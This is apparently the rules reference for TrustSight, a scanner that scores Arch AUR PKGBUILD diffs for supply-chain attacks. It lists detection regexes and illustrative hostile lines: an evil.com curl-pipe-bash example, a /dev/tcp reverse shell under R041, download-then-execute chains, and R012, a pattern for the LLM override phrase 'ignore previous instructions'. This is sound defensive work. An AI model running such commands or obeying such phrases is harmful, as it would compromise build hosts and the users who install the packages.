# Rules Reference

TrustSight uses rules to detect structural signals in PKGBUILD diffs. Each rule contributes to the final score based on its severity weight, match target, and scope.

## How scoring uses rules

The final score is computed from four signal sources. Rules are the primary source (Tier A):

**Score formula:**

```text
base = sum(severity_weight for each fired rule)
base += source_bucket_modifiers (Tier B)
base += novelty_weights scaled by maturity (Tier C)
base -= verification_evidence (Tier D)
base -= pinning_discounts
final = clamp(base, 0, 100)
```

If a FATAL rule fires, the score is immediately set to 100 regardless of all other signals.

### How severity weight maps to risk

Each severity level carries a weight that reflects its information value: how often does this signal fire on benign packages versus malicious ones?

| Severity | Weight | Fire rate on benign corpus | Meaning |
|----------|--------|---------------------------|---------|
| FATAL | 0 (hard-stop) | Never | Score immediately set to 100. Package is attempting to deceive the reviewer. |
| CRITICAL | 40 | Rare | Almost certainly malicious if triggered. curl pipe bash, sudo in functions. |
| HIGH | 25 | Low | Strong signal. Checksum manipulation, unexpected downloads. |
| MEDIUM | 15 | Moderate | Notable but not definitive. Install file changes. |
| LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
| INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |

A CRITICAL rule on its own (weight 40) pushes a package into the FLAGGED range (21+). A single HIGH rule (weight 25) does the same. Two MEDIUM rules (15 + 15 = 30) also reach FLAGGED. The 20-point CLEAN threshold means any single CRITICAL or HIGH rule, or any combination of lower-severity rules summing above 20, will flag the package.

### How match_target selects what the rule sees

PKGBUILDs encode meaning at two levels. The text of the file declares structure (variables, arrays, function boundaries). The resolved values of those variables determine what actually runs. Rules target one or the other:

- **`resolved` target**: the rule pattern is applied to the post-variable-expansion value of each function body and source array. This catches patterns hidden behind variables: `curl $url | $shell` in the diff becomes `curl https://evil.com/hook.sh | bash` after resolution.
- **`raw_line` target**: the rule pattern is applied to the literal diff line with the `+`/`-` prefix stripped. This catches patterns in the PKGBUILD structure itself: a `sha256sums=('SKIP')` declaration or a unicode bidi override character.

Some patterns are only visible at the raw level (structure, declarations, unicode characters). Some are only meaningful after resolution (actual URLs, command strings). The two-target design covers both surfaces.

### How scope reduces false positives

Scope restricts which lines a `raw_line` rule checks. Without scope, a rule like R009 (`sudo`) would fire on every line containing the word `sudo`, including comments (`# sudo is required`), messages (`echo "sudo needed"`), and top-level declarations (`groups=('sudo')`). The `function_body` scope restricts matching to lines inside `build()`, `package()`, `check()`, and similar functions where commands actually execute.

Scope is set per-rule in `rules.toml`. When absent, the rule matches all lines. Scope has no effect on `resolved`-target rules because resolution already strips comments and top-level declarations.

A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.

Note that a function's own header line (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A pattern that matches the header while scoping itself to `function_body` can never fire; `trustsight lint-rules` reports this as `scope-contradiction`.

### How rules map to evidence tiers

| Tier | Rule sources | What they measure |
|------|-------------|-------------------|
| A (Structural) | R001 to R013, R039 to R058, C001 to C007 | Direct pattern matching against PKGBUILD commands and structure |
| B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
| C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
| D (Verification) | Checksum, PGP, GPG presence | Cryptographic integrity metadata (subtractive) |

Rules only contribute to Tier A. Tiers B, C, and D are computed independently and added to the score alongside the rule contributions.

---

## R-series (TOML-configurable detection rules) {#r-series}

Defined in `~/.config/trustsight/rules.toml`. Loaded at runtime via `load_rules()` in `src/trustsight/config.py`.

Each rule supports these fields:

| Field | Type | Description |
|-------|------|-------------|
| `id` | `string` | Rule identifier (`R001`-`R013` core, `R039`+ expanded). |
| `name` | `string` | Human-readable name. |
| `pattern` | `string` | Python regex applied to the match target. |
| `severity` | `string` | `FATAL`, `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, or `INFO`. |
| `category` | `string` | Semantic category (`network_execution`, `obfuscation`, `installer`, `privilege`, `network_usage`, `injection`, `unicode`, `integrity`). |
| `match_target` | `string` | `"resolved"` : apply to variable-resolved command strings after tokenization. `"raw_line"` : apply to raw diff lines after stripping the `+`/`-` prefix. |
| `scope` | `list[string]` | (Optional, `raw_line` only) Restrict matching to line contexts (`["function_body"]`, `["message"]`, `["other"]`) or to a named PKGBUILD function (`["pkgver"]`, `["package"]`, `["package_foo"]`). When absent, matches all lines. |
| `added_only` | `bool` | (Optional, `raw_line` only) Match only added (`+`) lines. Raw diff lines include removals, so without this a maintainer *deleting* a suspicious line raises the score. All `R039`+ rules set it. |
| `experimental` | `bool` | (Optional) Skip the rule unless `[rules] experimental = true` in `config.toml`. Used for rules whose false-positive rate has not been measured against the benign corpus. |

### R001: Remote Script Execution {#r001}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `curl.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.

### R002: Wget Pipe to Shell {#r002}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `wget.*\|\s*(?:/bin/)?(?:bash|sh|python|zsh|dash|busybox\s+sh|source\s+/dev/stdin)`
- **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.

### R003: Base64 Decode and Execute {#r003}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `obfuscation`
- **Pattern:** `base64.*(?:\-d|\-\-decode).*\|`
- **Description:** Detects `base64 -d |` and `base64 --decode |` piped to execution. Base64-encoded scripts are a common obfuscation technique to hide malicious commands from casual review.

### R004: Checksum Disabled {#r004}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25), downgraded to INFO (weight 0) if justified
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=SKIP` appears in the diff.
- **Justification:** Severity is downgraded to INFO if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), `validpgpkeys` declaration, or DKMS reference. Justification checked via `is_skip_justified()` in `src/trustsight/differ.py`.
- **Note:** Hard-coded in `src/trustsight/analysis.py`. Cannot be disabled through `rules.toml` because checksum integrity is foundational to the scoring model.

### R005: Checksum Emptied {#r005}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=()` appears in the diff (array set to empty).
- **Note:** Hard-coded in `src/trustsight/analysis.py`. Cannot be disabled through `rules.toml`.

### R006: Insecure Download Protocol {#r006}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network_execution`
- **Pattern:** `https?://.*\.tar\.gz.*\|`
- **Description:** Detects `tar.gz` piped to execution (e.g. `curl ... tar.gz | tar -x`). Originally classified as HIGH/25 and later reduced. This entry previously documented it as LOW/5 on the grounds of a fire rate above 30%, but the shipped rule is MEDIUM and it fires on **0.00%** of the 3,322-diff benign corpus; the pattern requires a pipe on the same resolved line, which is rarer than the earlier note assumed.

### R007: Install File Modification {#r007}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `installer`
- **Pattern:** `\+.*\.install.*`
- **Scope:** All lines (no function-body restriction)
- **Description:** Fires when a `.install` file is added or modified in the diff. Install scripts run with root privileges and are a common vector for persistent backdoors.

### R008: Unexpected File Download {#r008}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
- **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.

### R009: Privilege Escalation {#r009}

- **Target:** `raw_line`
- **Severity:** CRITICAL (weight 40)
- **Category:** `privilege`
- **Pattern:** `\bsudo\b`
- **Scope:** `["function_body"]` only
- **Description:** Detects `sudo` inside function bodies. Does not fire in comments, messages (`echo`, `printf`, `note`), or top-level declarations. Scope restriction prevents false positives from `groups=('sudo')` or `echo "sudo required"`.

### R010: Uses curl in PKGBUILD {#r010}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bcurl\s`
- **Scope:** `["function_body"]` only
- **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.

### R011: Uses wget in PKGBUILD {#r011}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network_usage`
- **Pattern:** `\bwget\s`
- **Scope:** `["function_body"]` only
- **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.

### R012: LLM Prompt Injection {#r012}

- **Target:** `resolved`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `injection`
- **Pattern:** `ignore\s+(?:all\s+)?previous\s+(?:instructions|commands|input)`
- **Description:** Detects prompt-injection phrases in resolved strings. This is a **tripwire rule**: recall is 17% on the benchmark corpus. When it fires, the package is almost certainly malicious. When it does not, nothing can be concluded. Score hard-stops at 100 regardless of other signals.
- **Note:** The primary defense against prompt injection is the verdict-integrity assertions in the LLM translation stage, not this rule. Low recall is intentional and acceptable.

### R013: Unicode Bidi Override {#r013}

- **Target:** `raw_line`
- **Severity:** FATAL (hard-stop at 100, weight 0)
- **Category:** `unicode`
- **Pattern:** `[\u202A-\u202E\u2066-\u2069\u2060-\u2064\U000E0000-\U000E007F]|(?<![^\x00-\x7F])[\u200B-\u200F\uFEFF](?![^\x00-\x7F])`

The rule splits deceptive codepoints into two classes, because they are not equally suspicious.

**Fires unconditionally**: bidi overrides and isolates (U+202A-U+202E, U+2066-U+2069), invisible operators (U+2060-U+2064), and tag characters (U+E0000-U+E007F). None has a legitimate use in a build recipe. These are the characters that make displayed text differ from executed text.

**Fires only between ASCII neighbours**: zero-width and directional characters (U+200B-U+200F, U+FEFF). U+200B-U+200D are *mandatory* joiners in Malayalam, Lao, Devanagari and other scripts: a localized `GenericName[ml]=` line in a browser package legitimately contains U+200D. Because R013 is FATAL, firing on one scored an entirely benign package 100/100. Two packages in the benign corpus (`brave-origin-bin`, `zen-browser-bin`) did exactly this. Requiring ASCII on both sides preserves the attack (a joiner hidden inside an ASCII command or URL, such as `https://evil.com<U+200D>/pkg.tar.gz`) while dropping the false positive.

- **Note:** Score hard-stops at 100 regardless of other signals. The previous pattern omitted U+200E/U+200F, U+2060-U+2064 and the tag block, which is where the documented recall gap came from; `unicode.py` already listed them.

### Severity weights

Configured in `config.toml` `[severity_weights]`:

| Severity | Weight |
|----------|--------|
| FATAL | 0 (hard-stop score at 100) |
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

### FATAL rules {#fatal-rules}

R012 and R013 are FATAL. They contribute **0 weight** to the running total but immediately set `final_score = 100` and risk level `"Critical"`. No other rules are evaluated for weight contribution after a FATAL fires; the short-circuit is in `calculate_score()` at `src/trustsight/scoring.py`.

---

## C-series (code, structural rules) {#c-series}

Generated by `_structural_findings()` in `src/trustsight/analysis.py`. Not configurable via TOML. Fire based on structural comparisons between the diff and the post-diff state. Each one compares the *before* and *after* of the diff; a checksum that changed while the source stayed put, a URL swapped without a version bump; which a pattern matched against one line at a time cannot express. Comparisons use `_pkgver_changed_in_diff()` to detect `pkgver=` value changes.

`_structural_findings()` is shared by `analyze_package()` (live) and `scan_diff()` (offline replay), so the two pipelines cannot drift apart.

### C001: Checksum Changed Without Source Change With Stable Version {#c001}

- **Severity:** HIGH (weight 25)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did not change.
- **Description:** A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise.

### C002: Checksum Updated With Version Bump {#c002}

- **Severity:** INFO (weight 0)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did change.
- **Description:** Normal during routine version bumps. Recorded for audit trail; contributes no weight.

### C003: Source URL Changed Without Version Bump {#c003}

- **Severity:** INFO (weight 0)
- **Condition:** Source URLs were both added **and** removed (the sets differ) **and** `pkgver` did not change.
- **Description:** Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.


### C004: Checksum Removed For Unchanged Source {#c004}

- **Severity:** CRITICAL (weight 40)
- **Condition:** A checksum array line is deleted, no replacement checksum line is added, **and** the source URL set is unchanged.
- **Description:** Distinct from R005 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.

### C005: Binary Artifact From Untrusted Source {#c005}

- **Severity:** MEDIUM (weight 15)
- **Condition:** An added source URL points at an executable artifact (`.bin`, `.exe`, `.elf`, `.so`, `.dll`, `.dylib`, `.AppImage`, `.deb`, `.rpm`, `.apk`, `.msi`, `.jar`, `.run`) **and** its bucket is neither `trusted_forge` nor `official`.
- **Description:** A prebuilt binary cannot be reviewed from the PKGBUILD, so its provenance is the only available evidence. Restricted to untrusted buckets deliberately: `-bin` packages repackaging a GitHub release are a large fraction of the AUR and firing on all of them would make the rule pure noise.

### C006: Maintainer Change With New Source Domain {#c006}

- **Severity:** HIGH (weight 25)
- **Condition:** The maintainer changed **and** at least one added source URL is on a domain not present among the removed URLs.
- **Description:** Either signal alone is routine; maintainers change hands, domains migrate. Together they are the shape of an account takeover redirecting sources to attacker-controlled infrastructure. Requires maintainer metadata, so it fires only in the live path, not in offline corpus replay.

### C007: Command Substitution In Source Array {#c007}

- **Severity:** CRITICAL (weight 40)
- **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
- **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.

---

## Expanded ruleset (R039+) {#expanded-ruleset}

These rules roughly double the pattern-based detection surface. They are **enabled by default**, having been calibrated against a 3322-diff stratified benign corpus: fourteen fire on zero benign diffs, and every remaining hit was inspected individually; all but one were true positives. Enabling them costs 0.5 percentage points of zero-rate and leaves p95 unchanged.

The `experimental` flag remains supported for future additions. A rule carrying `experimental = true` is skipped unless `config.toml` sets:

```toml
[rules]
experimental = true
```

Numbering starts at R039 because `R014`-`R026` are already referenced by `tests/fixtures/baseline.json` and the malicious fixture generators; reusing those identifiers would silently change what they mean in existing baselines.

Every `raw_line` rule below sets `added_only = true`.

### R039: Eval With Dynamic Content {#r039}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `` \beval\s+(?:"|\$\(|\$\{|`|\$[a-zA-Z_]) ``
- **Description:** Detects `eval` applied to a variable, command substitution, or backtick expression. The payload is assembled at runtime, so no static pattern can see what will execute.

### R040: Shell -c With Dynamic Payload {#r040}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `` \b(?:bash|sh|zsh|dash)\s+-c\s+(?:\$\(|`|\$\{|"[^"]*\$) ``
- **Description:** Detects `sh -c` / `bash -c` whose argument contains a variable or substitution rather than a literal command.

### R041: Shell Network Redirection {#r041}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `network_execution`
- **Pattern:** `/dev/(?:tcp|udp)/`
- **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.

### R042: Download Then Execute {#r042}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
- **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.

### R043: Base64 Blob Decode {#r043}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `obfuscation`
- **Pattern:** `base64\s+(?:-d|--decode)\s*(?:<<<|<<\w*|\$\{?[a-zA-Z_])`
- **Description:** Detects `base64 -d` fed from a here-string or a variable, as opposed to decoding a file that is itself part of the source array.

### R044: Interpreter One-Liner With Network {#r044}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network_execution`
- **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
- **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.

### R045: Binary Encoding Pipe {#r045}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `obfuscation`
- **Pattern:** `\b(?:xxd|uudecode)\s+[^|]*\|`
- **Description:** Detects `xxd` or `uudecode` piped onward. Both reconstruct binary content from a text representation, a way to carry a payload past text review.

### R046: Source URL Uses IP Address {#r046}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Pattern:** `https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
- **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.

### R047: Source URL Uses Non-Standard Port {#r047}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
- **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.

### R048: Source URL On Free Registrar TLD {#r048}

- **Target:** `raw_line`
- **Severity:** LOW (weight 5)
- **Category:** `network`
- **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
- **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.

### R049: Compiler Plugin Or Loader Override {#r049}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fplugin=|-Wl,--dynamic-linker=)`
- **Description:** `-fplugin=` loads an arbitrary shared object into the compiler; `-Wl,--dynamic-linker=` changes which loader the produced binary uses. Both alter the build without touching any source file.

### R050: Compiler Hardening Disabled {#r050}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fno-stack-protector|-z\s*execstack)`
- **Description:** Detects removal of stack-protector or NX protections from the build flags.

### R051: Network Access In pkgver {#r051}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `packaging`
- **Scope:** `['pkgver']`
- **Pattern:** `\b(?:curl|wget|git\s+(?:clone|fetch|pull|ls-remote)|svn\s+(?:co|checkout)|hg\s+pull)\b`
- **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.

### R052: Dotfile Written To User Profile {#r052}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Pattern:** `\b(?:install|cp|mv|tee)\s+[^;&|]*(?:\$HOME|~|/root|/home/[^/\s]+)/\.\w+`
- **Description:** Detects writes to a dotfile under `$HOME`, `~`, `/root`, or `/home/<user>`, the shape of shell-profile persistence. Dotfiles written inside `$pkgdir` (such as `/etc/skel` templates) are ordinary packaging and do not match.

### R053: Setuid Or Setgid Bit Set In Package Root {#r053}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `privilege`
- **Pattern:** `\bchmod\s+(?:-\S+\s+)*(?:[2467][0-7]{3}\b|[ugoa]*\+s\b)\s+(?!["\x27]?/)`
- **Description:** Setuid or setgid applied to a path being staged into the package. Detects both octal (`4755`, `2755`) and symbolic (`u+s`) forms; ordinary modes such as `644`, `755` and `+x` do not match. Chromium's sandbox helper legitimately requires `4755`, so this fires on essentially every Electron package. Measured across the benign corpus, MEDIUM changes **no** package's risk band; the evidence stays visible in the tiered breakdown without reclassifying routine updates. At HIGH it would have reclassified every Electron package as Medium.

### R059: Setuid Or Setgid Bit Set Outside Package Root {#r059}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `privilege`
- **Pattern:** `\bchmod\s+(?:-\S+\s+)*(?:[2467][0-7]{3}\b|[ugoa]*\+s\b)\s+["\x27]?/`
- **Description:** The same operation against an absolute path. This touches the live filesystem rather than `$pkgdir`, so it is a privilege change on the build host and not packaging. Split from R053 because the two are materially different: `chmod u+s "$pkgdir/opt/x/chrome-sandbox"` is ordinary Electron packaging, while `chmod u+s "/usr/bin/helper"` is not.

### R054: Persistence Unit Outside Package Root {#r054}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `persistence`
- **Pattern:** `[\s"\x27](?:/etc/(?:cron\.[a-z]+|cron\.d|systemd/system)|/usr/lib/systemd/system|/var/spool/cron)/`
- **Description:** Detects a cron job or systemd unit written to an absolute system path rather than into `$pkgdir`. Installing a unit *into* `$pkgdir` is correct packaging; writing to the live filesystem during a build is not.

### R055: Git Clone With Variable Branch {#r055}

- **Target:** `resolved`
- **Severity:** MEDIUM (weight 15)
- **Category:** `source`
- **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
- **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.

### R056: Download Then Source {#r056}

- **Target:** `resolved`
- **Severity:** CRITICAL (weight 40)
- **Category:** `execution`
- **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
- **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.

### R057: TLS Verification Disabled {#r057}

- **Target:** `resolved`
- **Severity:** HIGH (weight 25)
- **Category:** `network`
- **Pattern:** `(?:curl\s+(?:[^;&|]*\s)?(?:--insecure|-k)\b|wget\s+(?:[^;&|]*\s)?--no-check-certificate\b)`
- **Description:** Detects `curl --insecure` / `curl -k` and `wget --no-check-certificate`. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it.

### R058: Write Outside Package Root {#r058}

- **Target:** `raw_line`
- **Severity:** HIGH (weight 25)
- **Category:** `system`
- **Pattern:** `^\+?\s*(?:sudo\s+)?(?:install|cp|mv|dd|tee)\s+[^;&|]*(?:(?<=\s)|(?<=\s["\x27]))(?:/etc|/boot|/usr/bin|/usr/lib)/`
- **Description:** Detects writes to `/etc`, `/boot`, `/usr/bin`, or `/usr/lib` by absolute path. The same write prefixed with `$pkgdir` is normal packaging and does not match.

---

## Benchmark performance

Measured against the TrustSight test corpus.

!!! warning "These figures predate two changes"

    They were measured while `observation_count` was never populated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../explanation/cold-start-and-maturity.md)). They also cover only the R001-R013 core ruleset, not the R039+ expanded rules or C004-C007. Both need a corpus rebuild and a re-baseline before they can be restated.

| Rule | Recall | Notes |
|------|--------|-------|
| CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
| R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
| R013 (unicode bidi) | 88 % | Misses some bidi variants. |
| Benign zero-rate | 81.5 % | Percentage of benign diffs scoring 0. |
| Benign p95 | 20 | 95th percentile score on benign corpus. |
| CRITICAL p5 | 40 | 5th percentile score on CRITICAL-class corpus. |
